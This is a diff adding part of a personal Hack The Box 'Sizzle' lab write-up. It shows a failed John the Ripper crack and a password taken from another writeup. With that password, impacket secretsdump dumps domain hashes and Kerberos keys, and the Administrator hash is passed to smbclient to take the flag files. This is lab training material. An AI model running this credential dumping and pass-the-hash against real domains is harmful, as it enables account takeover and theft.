@@ -815,5 +815,193 @@ mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
 ┌──(gua🥺kali-nyan)-[~/Documents/GitHub/Pen-Test-Reports/sizzle]
 └─$ cat mrlky.hash
 mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+```
+`mrb3n.hash` doesnt work but `mrlky.hash` does work?
+when i look up to [writeup](https://0xrick.github.io/hack-the-box/sizzle/#smb-scf-file-attack-amandas-credentials), he works
+pass was `Football#7`
+```
+┌──(gua🥺kali-nyan)-[~/Documents/GitHub/Pen-Test-Reports/sizzle]
+└─$ sudo john --format=NT mrlky.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 2 candidates buffered for the current salt, minimum 24 needed for performance.
+Warning: Only 20 candidates buffered for the current salt, minimum 24 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+Proceeding with incremental:ASCII
+0g 0:00:43:05  3/3 0g/s 43319Kp/s 43319Kc/s 43319KC/s mkefik8a..mkefik4h
+0g 0:00:43:06  3/3 0g/s 43320Kp/s 43320Kc/s 43320KC/s mkhk01ma..mkhk01lp
+0g 0:00:43:27  3/3 0g/s 43347Kp/s 43347Kc/s 43347KC/s tdj864kd..tdj86603
+0g 0:00:43:29  3/3 0g/s 43349Kp/s 43349Kc/s 43349KC/s 2l3z9866..2l3z98te
+0g 0:01:13:05  3/3 0g/s 43144Kp/s 43144Kc/s 43144KC/s STTROY7..STTROU9
+0g 0:01:54:41  3/3 0g/s 44559Kp/s 44559Kc/s 44559KC/s jrb9065g..jrb90ldm
+0g 0:01:54:55  3/3 0g/s 44544Kp/s 44544Kc/s 44544KC/s tjim580y..tjim5ad.
+0g 0:01:54:58  3/3 0g/s 44541Kp/s 44541Kc/s 44541KC/s tpfhtl1z..tpfhue0=
+0g 0:01:54:59  3/3 0g/s 44539Kp/s 44539Kc/s 44539KC/s 223khbbm..223kkayb
+0g 0:01:55:00  3/3 0g/s 44538Kp/s 44538Kc/s 44538KC/s 23m9kbrr..23m9kp0P
+0g 0:02:33:18  3/3 0g/s 43870Kp/s 43870Kc/s 43870KC/s culardy6d..culariorf
+0g 0:02:35:46  3/3 0g/s 43678Kp/s 43678Kc/s 43678KC/s n5;D..nv;E
+0g 0:02:35:47  3/3 0g/s 43677Kp/s 43677Kc/s 43677KC/s a-LJI_..a-L23)
+0g 0:02:44:53  3/3 0g/s 43500Kp/s 43500Kc/s 43500KC/s hehbciroy..hehbcirhf
+Session aborted
+```
+and i used it with [`secretsdump.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
+
+```shell
+┌──(gua🥺kali-nyan)-[~/Documents/GitHub/Pen-Test-Reports/sizzle]
+└─$ sudo chmod +x secretsdump.py
+[sudo] yuschumacher のパスワード:
+
+┌──(gua🥺kali-nyan)-[~/Documents/GitHub/Pen-Test-Reports/sizzle]
+└─$ ./secretsdump.py sizzle.htb.local/mrlky:Football#7@sizzle.htb.local
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:f6acf3b148119e581f4758a54f790a05:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
+Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
+Administrator:des-cbc-md5:ad7afb706715e964
+krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
+krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
+krbtgt:des-cbc-md5:866db35eb9ec5173
+amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
+amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
+amanda:des-cbc-md5:70ba677a4c1a2adf
+mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
+mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
+mrlky:des-cbc-md5:02f1a4da0432f7f7
+sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
+sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
+sizzler:des-cbc-md5:5d51d30e68d092d9
+SIZZLE$:aes256-cts-hmac-sha1-96:bde1841cfb9f3bbcb6a1523c9529b243dd905e454292c7aeb2e5bdf5b64ed0aa
+SIZZLE$:aes128-cts-hmac-sha1-96:4f165b100096491158bbd23d2925bc0b
+SIZZLE$:des-cbc-md5:e9519b15fd31ef86
+[*] Cleaning up...
 
 ```
+
+and we got another Admin hash:
+```shell
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+```
+
+```shell
+┌──(gua🥺kali-nyan)-[~/Documents/GitHub/Pen-Test-Reports/sizzle]
+└─$ smbclient //sizzle.htb/C$ -U "Administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267
+Try "help" to get a list of possible commands.
+smb: \> ls
+  $Recycle.Bin                      DHS        0  Thu Feb 11 21:06:54 2021
+  bootmgr                          AHSR   389408  Mon Nov 21 09:42:45 2016
+  BOOTNXT                           AHS        1  Sat Jul 16 22:18:08 2016
+  Department Shares                   D        0  Wed Jul  4 00:22:32 2018
+  Documents and Settings          DHSrn        0  Mon Jul  2 22:37:27 2018
+  inetpub                             D        0  Tue Jul  3 05:29:08 2018
+  pagefile.sys                      AHS 738197504  Mon Jun 13 21:59:14 2022
+  PerfLogs                            D        0  Sun Dec  2 11:56:24 2018
+  Program Files                      DR        0  Thu Feb 11 21:31:57 2021
+  Program Files (x86)                 D        0  Wed Sep 26 13:49:37 2018
+  ProgramData                       DHn        0  Thu Feb 11 21:31:05 2021
+  System Volume Information         DHS        0  Fri Jul 13 00:00:45 2018
+  Users                              DR        0  Thu Jul 12 06:59:27 2018
+  Windows                             D        0  Thu Feb 11 21:33:41 2021
+
+                7779839 blocks of size 4096. 3533730 blocks available
+smb: \> cd Users\
+smb: \Users\> ls
+  .                                  DR        0  Thu Jul 12 06:59:27 2018
+  ..                                 DR        0  Thu Jul 12 06:59:27 2018
+  .NET v4.5                           D        0  Tue Jul  3 05:29:55 2018
+  .NET v4.5 Classic                   D        0  Tue Jul  3 05:29:53 2018
+  administrator                       D        0  Mon Aug 20 04:04:38 2018
+  All Users                       DHSrn        0  Sat Jul 16 22:34:35 2016
+  amanda                              D        0  Mon Oct  1 06:05:06 2018
+  Default                           DHR        0  Mon Jul  2 22:37:27 2018
+  Default User                    DHSrn        0  Sat Jul 16 22:34:35 2016
+  desktop.ini                       AHS      174  Sat Jul 16 22:21:29 2016
+  mrlky                               D        0  Tue Jul  3 01:39:20 2018
+  mrlky.HTB                           D        0  Thu Jul 12 06:59:27 2018
+  Public                             DR        0  Mon Nov 21 10:24:46 2016
+  WSEnrollmentPolicyServer            D        0  Wed Jul  4 11:32:16 2018
+  WSEnrollmentServer                  D        0  Wed Jul  4 11:49:02 2018
+
+                7779839 blocks of size 4096. 3533797 blocks available
+smb: \Users\> cd mrlky
+smb: \Users\mrlky\> ls
+  .                                   D        0  Tue Jul  3 01:39:20 2018
+  ..                                  D        0  Tue Jul  3 01:39:20 2018
+  AppData                            DH        0  Tue Jul  3 01:38:04 2018
+  Application Data                DHSrn        0  Tue Jul  3 01:38:04 2018
+  Contacts                           DR        0  Tue Jul  3 01:39:20 2018
+  Cookies                         DHSrn        0  Tue Jul  3 01:38:04 2018
+  Desktop                            DR        0  Wed Jul 11 07:24:15 2018
+  Documents                          DR        0  Tue Jul  3 01:39:21 2018
+  Downloads                          DR        0  Tue Jul  3 01:39:20 2018
+  Favorites                          DR        0  Tue Jul  3 01:39:20 2018
+  Links                              DR        0  Tue Jul  3 01:39:22 2018
+  Local Settings                  DHSrn        0  Tue Jul  3 01:38:04 2018
+  Music                              DR        0  Tue Jul  3 01:39:20 2018
+  My Documents                    DHSrn        0  Tue Jul  3 01:38:04 2018
+  NetHood                         DHSrn        0  Tue Jul  3 01:38:04 2018
+  NTUSER.DAT                        AHn   786432  Mon Jun 13 23:09:21 2022
+  ntuser.dat.LOG1                   AHS    40960  Tue Jul  3 01:38:03 2018
+  ntuser.dat.LOG2                   AHS   167936  Tue Jul  3 01:38:03 2018
+  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TM.blf    AHS    65536  Tue Jul  3 03:33:02 2018
+  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Jul  3 03:33:02 2018
+  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Jul  3 03:33:02 2018
+  ntuser.ini                        AHS       20  Tue Jul  3 01:38:04 2018
+  Pictures                           DR        0  Tue Jul  3 01:39:20 2018
+  PrintHood                       DHSrn        0  Tue Jul  3 01:38:04 2018
+  Recent                          DHSrn        0  Tue Jul  3 01:38:04 2018
+  Saved Games                        DR        0  Tue Jul  3 01:39:21 2018
+  Searches                           DR        0  Tue Jul  3 01:39:21 2018
+  SendTo                          DHSrn        0  Tue Jul  3 01:38:04 2018
+  Start Menu                      DHSrn        0  Tue Jul  3 01:38:04 2018
+  Templates                       DHSrn        0  Tue Jul  3 01:38:04 2018
+  Videos                             DR        0  Tue Jul  3 01:39:20 2018
+
+                7779839 blocks of size 4096. 3533682 blocks available
+smb: \Users\mrlky\> cd Desktop\
+smb: \Users\mrlky\Desktop\> ls
+  .                                  DR        0  Wed Jul 11 07:24:15 2018
+  ..                                 DR        0  Wed Jul 11 07:24:15 2018
+  desktop.ini                       AHS      282  Tue Jul  3 01:39:20 2018
+  user.txt                           AR       34  Mon Jun 13 22:00:16 2022
+
+                7779839 blocks of size 4096. 3533754 blocks available
+smb: \Users\mrlky\Desktop\> get user.txt
+getting file \Users\mrlky\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \Users\mrlky\Desktop\> cd ../..
+smb: \Users\> cd administrator\Desktop\
+smb: \Users\administrator\Desktop\> ls
+  .                                  DR        0  Thu Feb 11 21:29:07 2021
+  ..                                 DR        0  Thu Feb 11 21:29:07 2021
+  desktop.ini                       AHS      282  Thu Feb 11 20:45:14 2021
+  root.txt                           AR       34  Mon Jun 13 22:00:16 2022
+
+                7779839 blocks of size 4096. 3533690 blocks available
+smb: \Users\administrator\Desktop\> get root.txt
+getting file \Users\administrator\Desktop\root.txt of size 34 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+```
+
+### links
+https://chiritsumo-blog.com/linux-smbclient/
+https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+https://hikari-blog.com/how-to-sftp/
+https://diary.shift-js.info/dom-clobbering/
+https://medium.com/cyber-security-resources/hacking-and-cracking-ntlm-hash-to-get-windows-admin-password-f44819b01db5
+https://qiita.com/y-araki-qiita/items/cda417e49108eee1fb7b
+https://mymanfile.com/?p=1426
+https://qiita.com/phase-d/items/61e45740bde489bbbb85
